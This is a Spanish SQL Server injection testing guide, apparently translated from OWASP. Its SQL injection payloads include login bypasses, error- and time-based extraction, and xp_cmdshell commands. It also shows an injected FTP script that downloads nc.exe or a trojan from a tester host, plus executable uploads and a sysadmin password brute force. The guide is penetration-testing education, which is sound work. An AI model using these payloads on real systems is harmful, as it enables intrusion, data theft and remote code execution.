# Pruebas para SQL Server

## Resumen

En esta sección se analizan algunas técnicas de [inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection) que utilizan características específicas de Microsoft SQL Server.

Las vulnerabilidades de inyección SQL se producen cuando se utiliza una entrada para construir una consulta SQL sin restringirla ni sanitizarla adecuadamente. El uso de SQL dinámico (la construcción de consultas SQL mediante la concatenación de cadenas) abre la puerta a estas vulnerabilidades. La inyección SQL permite a un atacante acceder a los servidores SQL y ejecutar código SQL con los privilegios del usuario utilizado para conectarse a la base de datos.

Como se explica en [inyección SQL](https://owasp.org/www-community/attacks/SQL_Injection), para explotar una vulnerabilidad de inyección SQL se necesitan dos cosas: un punto de entrada y un exploit que introducir. Cualquier parámetro controlado por el usuario que procese la aplicación podría ocultar una vulnerabilidad. Esto incluye:

- Parámetros de la aplicación en cadenas de consulta (por ejemplo, solicitudes GET)
- Parámetros de la aplicación incluidos como parte del cuerpo de una solicitud POST
- Información relacionada con el navegador (por ejemplo, user-agent, referrer)
- Información relacionada con el host (por ejemplo, hostname, IP)
- Información relacionada con la sesión (por ejemplo, ID de usuario, cookies)

Microsoft SQL Server tiene algunas características únicas, por lo que algunos exploits deben personalizarse específicamente para esta aplicación.

## Cómo probar

### Características de SQL Server

Para comenzar, veamos algunos operadores y comandos/procedimientos almacenados de SQL Server que son útiles en una prueba de inyección SQL:

- operador de comentario: `--` (útil para hacer que la consulta ignore el resto de la consulta original; no será necesario en todos los casos)
- separador de consultas: `;` (punto y coma)
- Entre los procedimientos almacenados y las características útiles se incluyen:
    - [xp_cmdshell](https://learn.microsoft.com/en-us/sql/relational-databases/system-stored-procedures/xp-cmdshell-transact-sql) ejecuta un shell de comandos en el servidor con la cuenta de servicio de SQL Server. Requiere privilegios `sysadmin` y está deshabilitado de forma predeterminada desde SQL Server 2005 (se puede volver a habilitar con `sp_configure` después de mostrar las opciones avanzadas).
    - `xp_regread` lee un valor arbitrario del Registro (procedimiento extendido no documentado)
    - `xp_regwrite` escribe un valor arbitrario en el Registro (procedimiento extendido no documentado)
    - [sp_makewebtask](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008/ms180099(v=sql.100)) (eliminado; solo está presente en versiones muy antiguas de SQL Server) escribía los resultados de una consulta en un archivo mediante Web Assistant.
    - [xp_sendmail](https://learn.microsoft.com/en-us/previous-versions/sql/sql-server-2008-r2/ms189505(v=sql.105)) (eliminado junto con SQL Mail) enviaba correos electrónicos que podían incluir un conjunto de resultados de consulta como archivo adjunto.

Los ejemplos siguientes se centran en técnicas que siguen siendo pertinentes en SQL Server y Azure SQL Managed Instance cuando se exponen características privilegiadas. La mayoría utiliza `exec`.

A continuación mostramos cómo ejecutar un comando de shell que escribe la salida del comando `dir c:\inetpub` en un archivo que se pueda consultar en un navegador, suponiendo que el servidor web y el servidor de BD residen en el mismo host. La siguiente sintaxis utiliza `xp_cmdshell`:

`exec master.dbo.xp_cmdshell 'dir c:\inetpub > c:\inetpub\wwwroot\test.txt'--`

En versiones antiguas de SQL Server que todavía incluyen procedimientos de Web Assistant, también se podía utilizar `sp_makewebtask`:

`exec sp_makewebtask 'C:\Inetpub\wwwroot\test.txt', 'select * from master.dbo.sysobjects'--`

Una ejecución exitosa creará un archivo que el probador podrá consultar en un navegador.

Además, las funciones integradas y las variables de entorno de SQL Server son muy útiles. Lo siguiente utiliza la función `db_name()` para provocar un error que devolverá el nombre de la base de datos:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20db_name())`

Observa el uso de [convert](https://learn.microsoft.com/en-us/sql/t-sql/functions/cast-and-convert-transact-sql):

`CONVERT ( data_type [ ( length ) ] , expression [ , style ] )`

`CONVERT` intentará convertir el resultado de `db_name` (una cadena) en una variable entera, lo que provocará un error que, si la aplicación vulnerable lo muestra, contendrá el nombre de la BD.

El siguiente ejemplo utiliza la variable de entorno `@@version`, combinada con una inyección de tipo `union select`, para averiguar la versión de SQL Server.

`/form.asp?prop=33%20union%20select%201,2006-01-06,2007-01-06,1,'stat','name1','name2',2006-01-06,1,@@version%20--`

Y aquí está el mismo ataque, pero utilizando de nuevo el truco de conversión:

`/controlboard.asp?boardID=2&itemnum=1%20AND%201=CONVERT(int,%20@@VERSION)`

La recopilación de información es útil para explotar vulnerabilidades de software en SQL Server mediante la explotación de un ataque de inyección SQL o el acceso directo al listener de SQL.

A continuación mostramos varios ejemplos de explotación de vulnerabilidades de inyección SQL a través de diferentes puntos de entrada.

### Ejemplo 1: Inyección SQL en una solicitud GET

El caso más sencillo (y a veces más provechoso) sería el de una página de inicio de sesión que solicita un nombre de usuario y una contraseña. Puedes intentar introducir la siguiente cadena "' or '1'='1" (sin comillas dobles):

`https://vulnerable.web.app/login.asp?Username='%20or%20'1'='1&Password='%20or%20'1'='1`

Si la aplicación utiliza consultas SQL dinámicas y la cadena se añade a la consulta de validación de credenciales del usuario, esto podría permitir iniciar sesión correctamente en la aplicación.

### Ejemplo 2: Inyección SQL en una solicitud GET

Para averiguar cuántas columnas existen

`https://vulnerable.web.app/list_report.aspx?number=001%20UNION%20ALL%201,1,'a',1,1,1%20FROM%20users;--`

### Ejemplo 3: Pruebas en una solicitud POST

Inyección SQL, contenido HTTP POST: `email=%27&whichSubmit=submit&submit.x=0&submit.y=0`

Un ejemplo completo de solicitud POST (`https://vulnerable.web.app/forgotpass.asp`):

```txt
POST /forgotpass.asp HTTP/1.1
Host: vulnerable.web.app
[...]
Referer: https://vulnerable.web.app/forgotpass.asp
Content-Type: application/x-www-form-urlencoded
Content-Length: 50

email=%27&whichSubmit=submit&submit.x=0&submit.y=0
```

El mensaje de error obtenido al introducir un carácter `'` (comilla simple) en el campo de correo electrónico es:

```txt
Microsoft OLE DB Provider for SQL Server error '80040e14'
Unclosed quotation mark before the character string '' '.
/forgotpass.asp, line 15
```

### Ejemplo 4: Otro ejemplo útil de GET

Obtener el código fuente de la aplicación

`a' ; master.dbo.xp_cmdshell ' copy c:\inetpub\wwwroot\login.aspx c:\inetpub\wwwroot\login.txt';--`

### Ejemplo 5: Habilitar o reemplazar `xp_cmdshell`

Las líneas base de seguridad mantienen deshabilitado `xp_cmdshell`. Con derechos `sysadmin` (de forma nativa o después de recuperar la contraseña de `sa` o de administrador; véase más abajo), se puede volver a habilitar o recrear una funcionalidad equivalente.

Habilita `xp_cmdshell` mediante una inyección:

```sql
master..sp_configure 'show advanced options',1
reconfigure
master..sp_configure 'xp_cmdshell',1
reconfigure
```

En instalaciones antiguas de SQL Server 2000, si `xp_cmdshell` se había eliminado con `sp_dropextendedproc`, se podía restaurar con:

`sp_addextendedproc 'xp_cmdshell','xp_log70.dll'`

Si esto fallaba porque `xp_log70.dll` se había movido o eliminado, un procedimiento personalizado que utilizara OLE Automation (`sp_OACreate`, `sp_OAMethod`, `sp_OADestroy`) podía recrear la ejecución de comandos de shell, tal como describe Antonin Foller (véanse los enlaces al final de la página), siempre que OLE Automation siguiera habilitado.

### Ejemplo 6: Referer / User-Agent

El encabezado `REFERER` establecido en:

`Referer: https://vulnerable.web.app/login.aspx', 'user_agent', 'some_ip'); [SQL CODE]--`

Permite ejecutar código SQL arbitrario. Lo mismo ocurre con el encabezado User-Agent establecido en:

`User-Agent: user_agent', 'some_ip'); [SQL CODE]--`

### Ejemplo 7: SQL Server como escáner de puertos

En SQL Server, uno de los comandos más útiles (al menos para quien realiza la prueba de penetración) es OPENROWSET, que se utiliza para ejecutar una consulta en otro servidor de BD y recuperar los resultados. El probador de penetración puede utilizar este comando para escanear los puertos de otras máquinas de la red objetivo, inyectando la siguiente consulta:

`select * from OPENROWSET('SQLOLEDB','uid=sa;pwd=foobar;Network=DBMSSOCN;Address=x.y.w.z,p;timeout=5','select 1')--`

Esta consulta intentará conectarse a la dirección x.y.w.z en el puerto p. Si el puerto está cerrado, se devolverá el siguiente mensaje:

`SQL Server does not exist or access denied`

Por otro lado, si el puerto está abierto, se devolverá uno de los siguientes errores:

`General network error. Check your network documentation`

`OLE DB provider 'sqloledb' reported an error. The provider did not give any information about the error.`

Por supuesto, el mensaje de error no siempre está disponible. En ese caso, podemos utilizar el tiempo de respuesta para entender lo que ocurre: con un puerto cerrado, se agotará el tiempo de espera (5 segundos en este ejemplo), mientras que un puerto abierto devolverá el resultado de inmediato.

Ten en cuenta que `OPENROWSET` y las consultas distribuidas ad hoc están deshabilitados de forma predeterminada desde SQL Server 2005 (estaban habilitados de forma predeterminada en SQL Server 2000).

### Ejemplo 8: Carga de ejecutables

Una vez que podemos utilizar `xp_cmdshell` (ya sea el nativo o uno personalizado), podemos cargar fácilmente ejecutables en el servidor de BD objetivo. Una opción muy común es `netcat.exe`, pero cualquier troyano será útil en este caso. Si el objetivo tiene permitido iniciar conexiones FTP a la máquina del probador, basta con inyectar las siguientes consultas:

```sql
exec master..xp_cmdshell 'echo open ftp.tester.org > ftpscript.txt';--
exec master..xp_cmdshell 'echo USER >> ftpscript.txt';--
exec master..xp_cmdshell 'echo PASS >> ftpscript.txt';--
exec master..xp_cmdshell 'echo bin >> ftpscript.txt';--
exec master..xp_cmdshell 'echo get nc.exe >> ftpscript.txt';--
exec master..xp_cmdshell 'echo quit >> ftpscript.txt';--
exec master..xp_cmdshell 'ftp -s:ftpscript.txt';--
```

En este punto, `nc.exe` se habrá cargado y estará disponible.

Si el firewall no permite FTP, existe una alternativa que aprovecha el depurador de Windows, `debug.exe`, instalado de forma predeterminada en todas las máquinas Windows. `Debug.exe` se puede controlar mediante un script y es capaz de crear un ejecutable al ejecutar un archivo de script adecuado. Lo que hay que hacer es convertir el ejecutable en un script de depuración (que es un archivo 100 % ASCII), cargarlo línea por línea y, por último, llamar a `debug.exe` con él. Hay varias herramientas que crean estos archivos de depuración (por ejemplo: `makescr.exe` de Ollie Whitehouse y `dbgtool.exe` de `toolcrypt.org`). Por lo tanto, las consultas que se deben inyectar son las siguientes:

```sql
exec master..xp_cmdshell 'echo [debug script line #1 of n] > debugscript.txt';--
exec master..xp_cmdshell 'echo [debug script line #2 of n] >> debugscript.txt';--
....
exec master..xp_cmdshell 'echo [debug script line #n of n] >> debugscript.txt';--
exec master..xp_cmdshell 'debug.exe < debugscript.txt';--
```

En este punto, nuestro ejecutable está disponible en la máquina objetivo, listo para ejecutarse. Hay herramientas que automatizan este proceso; entre las más destacadas están `Bobcat`, que se ejecuta en Windows, y `Sqlninja`, que se ejecuta en Unix (véanse las herramientas al final de esta página).

### Obtener información cuando no se muestra (fuera de banda)

No todo está perdido cuando la aplicación web no devuelve información, como mensajes de error descriptivos (cf. [Inyección SQL ciega](https://owasp.org/www-community/attacks/Blind_SQL_Injection)). Por ejemplo, puede ocurrir que se tenga acceso al código fuente (por ejemplo, porque la aplicación web se basa en software de código abierto). En ese caso, el probador de penetración puede explotar sin conexión todas las vulnerabilidades de inyección SQL descubiertas en la aplicación web. Aunque un IPS podría detener algunos de estos ataques, lo mejor sería proceder de la siguiente manera: desarrollar y probar los ataques en un banco de pruebas creado para ese propósito y, después, ejecutarlos contra la aplicación web que se está probando.

Otras opciones para ataques fuera de banda se describen en el [Ejemplo 4 anterior](#example-4-yet-another-useful-get-example).

### Ataques de inyección SQL ciega

#### Prueba y error

Como alternativa, se puede probar suerte. Es decir, el atacante puede suponer que existe una vulnerabilidad de inyección SQL ciega o fuera de banda en la aplicación web. A continuación, seleccionará un vector de ataque (por ejemplo, una entrada web), [utilizará vectores de fuzzing](../../6-Appendix/D-Fuzzing.md) contra ese canal y observará la respuesta. Por ejemplo, si la aplicación web busca un libro mediante una consulta

```sql
select * from books where title="text entered by the user"
```

el probador de penetración podría introducir el texto: `'Bomba' OR 1=1-` y, si los datos no se validan correctamente, la consulta se ejecutará y devolverá la lista completa de libros. Esto demuestra que existe una vulnerabilidad de inyección SQL. Más adelante, el probador de penetración podría `jugar` con las consultas para evaluar la criticidad de esta vulnerabilidad.

> **_NOTA:_**  Ten cuidado al inyectar la condición OR 1=1 en una consulta SQL. Aunque esto puede ser inofensivo en el contexto inicial en el que se inyecta, es común que las aplicaciones utilicen datos de una sola solicitud en varias consultas distintas. Si la condición llega, por ejemplo, a una instrucción UPDATE o DELETE, esto puede provocar una pérdida accidental de datos.

#### Si se muestran varios mensajes de error

Por otro lado, si no se dispone de información previa, todavía es posible atacar mediante la explotación de cualquier `canal encubierto`. Puede ocurrir que se supriman los mensajes de error descriptivos, pero que los mensajes de error proporcionen cierta información. Por ejemplo:

- En algunos casos, la aplicación web (en realidad, el servidor web) podría devolver el tradicional `500: Internal Server Error`, por ejemplo, cuando la aplicación devuelve una excepción que podría generarse, entre otros motivos, por una consulta con comillas sin cerrar.
- En otros casos, el servidor devolverá un mensaje `200 OK`, pero la aplicación web devolverá algún mensaje de error introducido por los desarrolladores, como `Internal server error` o `bad data`.

Este único bit de información podría bastar para entender cómo construye la aplicación web la consulta SQL dinámica y ajustar un exploit. Otro método fuera de banda consiste en mostrar los resultados mediante archivos accesibles desde un navegador a través de HTTP.

#### Ataques de temporización

Hay otra posibilidad para realizar un ataque de inyección SQL ciega cuando no hay información visible de la aplicación: medir el tiempo que tarda la aplicación web en responder a una solicitud. Anley [describe un ataque de este tipo](https://web.archive.org/web/20160413052024/https://www.encription.co.uk/downloads/more_advanced_sql_injection.pdf); de ese documento tomamos los siguientes ejemplos. Un enfoque típico utiliza el comando `waitfor delay`: supongamos que el atacante quiere comprobar si existe la base de datos de ejemplo `pubs`; bastará con que inyecte el siguiente comando:

`if exists (select * from pubs..pub_info) waitfor delay '0:0:5'`

Según el tiempo que tarde en devolverse la consulta, sabremos la respuesta. En realidad, aquí tenemos dos cosas: una `vulnerabilidad de inyección SQL` y un `canal encubierto` que permite al probador de penetración obtener 1 bit de información por cada consulta. Por lo tanto, mediante varias consultas (tantas como bits tenga la información requerida), el probador de penetración puede obtener cualquier dato de la base de datos. Observa la siguiente consulta:

```sql
declare @s varchar(8000)
declare @i int
select @s = db_name()
select @i = [some value]
if (select len(@s)) < @i waitfor delay '0:0:5'
```

Al medir el tiempo de respuesta y utilizar distintos valores para `@i`, podemos deducir la longitud del nombre de la base de datos actual y, luego, comenzar a extraer el nombre propiamente dicho con la siguiente consulta:

`if (ascii(substring(@s, @byte, 1)) & ( power(2, @bit))) > 0 waitfor delay '0:0:5'`

Esta consulta esperará 5 segundos si el bit `@bit` del byte `@byte` del nombre de la base de datos actual es 1, y responderá de inmediato si es 0. Al anidar dos ciclos (uno para `@byte` y otro para `@bit`), podremos extraer toda la información.

Sin embargo, puede ocurrir que el comando `waitfor` no esté disponible (por ejemplo, porque lo filtra un IPS o un firewall de aplicaciones web). Esto no significa que no se puedan realizar ataques de inyección SQL ciega, ya que el probador de penetración solo tiene que encontrar una operación que consuma tiempo y no esté filtrada. Por ejemplo:

```sql
declare @i int select @i = 0
while @i < 0xaffff begin
select @i = @i + 1
end
```

#### Comprobación de la versión y las vulnerabilidades

El mismo método de temporización puede utilizarse para identificar la versión de SQL Server mediante la variable integrada `@@version`:

`select @@version`

Ejemplos de respuestas:

`Microsoft SQL Server 2022 (RTM) - 16.0.1000.6 (X64) ...`

`Microsoft SQL Server 2019 (RTM) - 15.0.2000.5 (X64) ...`

`Microsoft SQL Server 2005 - 9.00.1399.06 (Intel X86) Oct 14 2005 00:33:37`

Como el año del producto y el número de compilación aparecen en posiciones diferentes según la versión, extrae una subcadena distintiva (por ejemplo, `2022`, `2019` o el número de versión principal, como `16.0`) en lugar de codificar de forma fija una única posición de carácter. Una comprobación basada en la temporización podría ser así:

`if (select @@version) like '%2022%' waitfor delay '0:0:5'`

### Ejemplo 9: Fuerza bruta de la contraseña de sysadmin

Para obtener por fuerza bruta la contraseña de sysadmin, podemos aprovechar que `OPENROWSET` necesita credenciales válidas para realizar correctamente la conexión y que dicha conexión también puede «redirigirse» al servidor de BD local. Al combinar estas características con un ataque de inyección por inferencia basado en el tiempo de respuesta, podemos inyectar el siguiente código:

`select * from OPENROWSET('SQLOLEDB','';'sa';'<pwd>','select 1;waitfor delay ''0:0:5'' ')`

Lo que hacemos aquí es intentar una conexión a la base de datos local (indicada por el campo vacío después de `SQLOLEDB`) utilizando `sa` y `<pwd>` como credenciales. Si la contraseña es correcta y la conexión se realiza correctamente, se ejecutará la consulta y la BD esperará 5 segundos (y también devolverá un valor, ya que OPENROWSET espera al menos una columna). Al obtener contraseñas candidatas de una lista de palabras y medir el tiempo que necesita cada conexión, podemos intentar adivinar la contraseña correcta. En «Data-mining with SQL Injection and Inference», David Litchfield lleva esta técnica aún más lejos: inyecta código para obtener por fuerza bruta la contraseña de sysadmin utilizando los recursos de CPU del propio servidor de BD.

Una vez que tenemos la contraseña de sysadmin, tenemos dos opciones:

- Inyectar todas las consultas posteriores mediante `OPENROWSET` para utilizar privilegios de sysadmin
- Añadir el usuario actual al grupo sysadmin mediante `sp_addsrvrolemember`. El nombre de usuario actual se puede extraer mediante una inyección por inferencia contra la variable `system_user`.

Recuerda que las consultas distribuidas ad hoc y `OPENROWSET` están restringidos desde SQL Server 2005 y, por lo general, un administrador debe habilitarlos explícitamente.
